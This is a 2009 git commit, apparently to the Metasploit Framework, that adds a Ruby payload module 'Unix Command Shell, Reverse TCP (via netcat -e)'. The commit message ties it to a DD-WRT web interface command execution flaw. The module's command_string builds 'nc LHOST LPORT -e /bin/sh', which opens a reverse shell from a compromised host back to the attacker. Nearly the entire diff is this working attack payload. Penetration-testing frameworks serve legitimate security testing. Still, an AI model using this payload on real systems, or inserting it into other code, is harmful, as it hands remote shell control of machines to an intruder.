47ebd620921fae3ded8bcbccf1c989a07aa75359
HD Moore <hd_moore@rapid7.com>
2009-07-21 12:56:42 +0000

    Adds coverage for the DD-WRT web interface command execution flaw, adds two netcat -e payloads to work with it
    git-svn-id: file:///home/svn/framework3/trunk@6852 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/unix/reverse_netcat.rb
@@ -0,0 +1,56 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+
+module Metasploit3
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Unix Command Shell, Reverse TCP (via netcat -e)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Creates an interactive shell via netcat',
+			'Author'        => 'hdm',
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'unix',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+		"nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+	end
+
+end
